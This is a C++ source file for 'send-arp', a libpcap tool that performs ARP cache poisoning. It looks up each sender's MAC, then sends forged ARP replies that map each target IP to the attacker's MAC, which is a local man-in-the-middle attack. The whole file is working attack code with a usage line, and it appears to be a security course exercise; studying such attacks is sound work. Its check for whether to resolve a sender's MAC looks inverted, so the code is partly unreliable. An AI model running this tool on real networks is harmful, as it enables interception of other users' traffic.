#include <iostream>
#include <stdio.h>
#include <cstdio>
#include <pcap.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <map>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

using namespace std;

#pragma pack(push, 1)
struct arp_packet {
  EthHdr eth_;
  ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
  printf("syntax : send-arp <interface> <sender0 ip> <target0 ip> <sender1 ip> <target1 ip> ...\n");
  printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// ref:
// https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx
Mac getMyMacAddress(char* dev) {
  int fd;

  struct ifreq ifr;
  Mac mac_address;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, (const char*)dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFHWADDR, &ifr);

  close(fd);

  mac_address = (uint8_t*)ifr.ifr_hwaddr.sa_data;

  return mac_address;
}

// ref:
// https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
Ip getMyIpv4Address(const char* dev) {
  int fd;
  struct ifreq ifr;
  uint32_t ip_address;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char*)ifr.ifr_name, dev, IFNAMSIZ - 1);

  ioctl(fd, SIOCGIFADDR, &ifr);

  close(fd);

  ip_address = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);

  return ip_address;
}

int sendArpPacket(pcap_t* handle, Mac ethernetDestinationMac,
                    Mac ethernetSourceMac, u_short operation, Mac arpSourceMac,
                    Ip arpSourceIp, Mac arpTargetMac, Ip arpTargetIp) {
  arp_packet packet;

  packet.eth_.dmac_ = ethernetDestinationMac;
  packet.eth_.smac_ = ethernetSourceMac;
  packet.eth_.type_ = htons(EthHdr::Arp);

  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = Mac::SIZE;
  packet.arp_.pln_ = Ip::SIZE;
  packet.arp_.op_ = operation;
  packet.arp_.smac_ = arpSourceMac;
  packet.arp_.sip_ = arpSourceIp;
  packet.arp_.tmac_ = arpTargetMac;
  packet.arp_.tip_ = arpTargetIp;

  return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet),
                         sizeof(arp_packet));
}

int sendArpRequest(pcap_t* handle, Mac sourceMac,
                    Ip sourceIp, Ip targetIp) {
  return sendArpPacket(handle, Mac("ff:ff:ff:ff:ff:ff"), sourceMac,
                            htons(ArpHdr::Request), sourceMac, htonl(sourceIp),
                            Mac("00:00:00:00:00:00"), htonl(targetIp));
}

int sendArpReply(pcap_t* handle, Mac sourceMac,
                    Ip sourceIp, Mac targetMac, Ip targetIp) {
  return sendArpPacket(handle, targetMac, sourceMac,
                          htons(ArpHdr::Reply), sourceMac, htonl(sourceIp),
                          targetMac, htonl(targetIp));
}

int main(int argc, char* argv[]) {  
  if (4 > argc || 0 != argc%2) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == nullptr) {
    printf("ERROR: Couldn't open device %s(%s)\n", dev, errbuf);
    return -1;
  }

  Mac myMac = getMyMacAddress(dev);
  Ip  my_ip = getMyIpv4Address(dev);

  map<Ip, Mac> senderMac;
  Ip senderIp[(argc-2)/2];
  Ip targetIp[(argc-2)/2];

  for (int i=0 ; i < (argc-2)/2 ; i++) {
    senderIp[i] = Ip(argv[2+i*2]);
    targetIp[i] = Ip(argv[3+i*2]);
  }

  int res;

  for (int i=0 ; i < (argc-2)/2 ; i++) {
    if (NULL != senderMac[senderIp[i]]) {
      res = sendArpRequest(handle, myMac, my_ip, senderIp[i]);

      if (res != 0) {
        printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
               pcap_geterr(handle));
        return -1;
      }

      struct pcap_pkthdr* header;
      const uint8_t* packet;
      while (true) {
        sleep(0);
        res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
          printf("ERROR: pcap_next_ex return %d error=%s\n", res,
                 pcap_geterr(handle));
          return -1;
        }

        EthHdr* replyEthernet = (EthHdr*)packet;

        if (replyEthernet->type() != EthHdr::Arp) {
          continue;
        }

        ArpHdr* arpreply = (ArpHdr*)(packet + sizeof(EthHdr));

        if (arpreply->hrd() != ArpHdr::ETHER ||
            arpreply->pro() != EthHdr::Ip4 || arpreply->op() != ArpHdr::Reply) {
          continue;
        }

        if (arpreply->tmac() == myMac && arpreply->tip() == my_ip &&
            arpreply->sip() == senderIp[i]) {
          senderMac.insert(make_pair(senderIp[i], arpreply->smac()));
          break;
        }
      }
    }
  }

  for (int i=0 ; i < (argc-2)/2 ; i++) {
    res = sendArpReply(handle, myMac, targetIp[i], senderMac[senderIp[i]], senderIp[i]);

    if (res != 0) {
      printf("ERROR: pcap_sendpacket return %d error=%s\n", res,
             pcap_geterr(handle));
      return -1;
    }
  }

  pcap_close(handle);

  printf("Done!\n");
}
